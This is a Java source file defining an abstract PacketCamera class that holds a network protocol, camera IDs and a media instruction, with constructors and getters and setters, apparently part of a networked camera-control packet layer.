package com.melardev.xeytanj.net.packets.camera;

import com.melardev.xeytanj.enums.MediaInstruction;
import com.melardev.xeytanj.enums.NetworkProtocol;
import com.melardev.xeytanj.net.packets.Packet;
import com.melardev.xeytanj.net.packets.PacketType;

import java.util.List;

public abstract class PacketCamera extends Packet {
    protected NetworkProtocol protocol;
    protected List<Integer> cameraIds;
    protected MediaInstruction packetContent;


    public PacketCamera(NetworkProtocol protocol, int port) {
        super(PacketType.CAMERA);
        this.protocol = protocol;
    }

    public PacketCamera(MediaInstruction packetContent) {
        super(PacketType.CAMERA);
        this.packetContent = packetContent;
    }

    public void setCameraIds(List<Integer> cameraIds) {
        this.cameraIds = cameraIds;
    }

    public MediaInstruction getPacketContent() {
        return packetContent;
    }

    public void setPacketContent(MediaInstruction packetContent) {
        this.packetContent = packetContent;
    }

    public NetworkProtocol getProtocol() {
        return protocol;
    }

    public void setProtocol(NetworkProtocol protocol) {
        this.protocol = protocol;
    }


    public PacketCamera(PacketType packetType) {
        super(packetType);
    }

    public List<Integer> getCameraIds() {
        return this.cameraIds;
    }
}
